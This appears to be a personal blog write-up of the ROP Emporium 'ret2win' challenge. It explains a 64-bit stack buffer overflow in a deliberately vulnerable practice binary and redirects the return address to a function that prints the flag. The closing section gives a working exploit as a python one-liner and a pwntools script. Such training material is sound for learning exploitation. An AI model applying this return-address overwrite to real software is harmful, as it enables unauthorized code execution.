title: "RopEmporium - Ret2win"

I recently came across Rop Emporium and I thought I'd give it a go and post my progress! Let's jump in...

All the challenges are hosted on the site https://ropemporium.com/, there is also a guide with plenty of useful information, tools and techniques that be used during the challenges.

# ret2win - https://ropemporium.com/challenge/ret2win.html

The description for ret2win starts with "ret2win means 'return here to win'" - sounds simple, right?

Running the binary and we see the message below, it mentions trying to 56 bytes into 32 bytes of stack buffer, what could go wrong? We know that the stack grows down from higher addresses to lower addresses, and when a function prolog takes place it reserves space on the stack for local variables.

If we execute the binary with more than 32 characters what'll happen? Let's try with 48 characters...

Yep, we overflowed the buffer and caused the binary to segfault. Why? The call to read() accepts upto 56 bytes, which is 24 more than the 32 bytes of variable space allocated. Our input is accepted pushing the data onto the stack, the 'pwnme' function wraps up, and the ret instruction then pops the next 8 bytes off the stack which is 'AAAAAAAA', because this isn't a valid memory address, it segfaults!

When the read() function stores the data on the stack it starts from lower addresses and works to high addresses, overwriting any existing data in memory as it goes...

Before we move on it's handy to enumerate the binary, we'll use NM to understand the symbols or functions within the binary, and Rabin2 to see what mitigations are enabled.

Within the binary there are a few functions, including one called `ret2win` at address `0x0000000000400756`. There is a `mov    edi,0x400943` then `call   400560 <system@plt>`, lets see what string is being moved into edi from address `0x400983` - Rabin2 is great for analysing strings in binaries.

![alt text](https://ben0.github.io/assets/images/ret2win-rabin2-strings.PNG "Strings within the binary")

Our objective is to overwrite the return address from pwnme to jump to the symbol `ret2win` rather than jumping back `main`, within the ret2win function the system call will execute the string in edi which is `/bin/cat flag.txt`.

## Exploit

Using GDB it's easy to debug the binary, experimenting with different payloads to understand what's happening.

What we know:

- It's 64bit
- The buffer is 32 bytes and and read() accepts 56 bytes, meaning a stackover flow can occur
- ASLR is disabled (PIC), the adddresses of our symbols will be the same every time the binary is run

Firing up GDB with the binary, set a breakpoint on the address of pwnme with `break *pwnme`, and run the binary with `run < <(python -c "print 'A' * 32 + 'B' * 8 + 'C' * 8")`, continue, and step through a few instructions, and we're setup for the which will pop the next instruction off the stack and try and jump to it.

In the screenshot we can the top of the stacking is pointing `CCCCCCCC` or `0x4343434343434343`, this will be popped off the stack into RIP and executed, though this time it'll segfault. But we know that whatever is in those 41-48 bytes will end up in the instruction register.

### Method 1 - Python

`python -c "print 'A' * 32 + 'B' * 8 + '\x00\x00\x00\x00\x00\x40\x07\x56'[::-1]" | ./ret2win`

### Method 2- Pwntools

```
from pwn import *

context.arch = 'amd64'

elf = ELF("ret2win")

pwnme_symbol = p64(elf.symbols["ret2win"])

payload = b"a" * 40
payload += pwnme_symbol

io = elf.process()
io.sendline(payload)
data = io.recvall()
print(data)
```
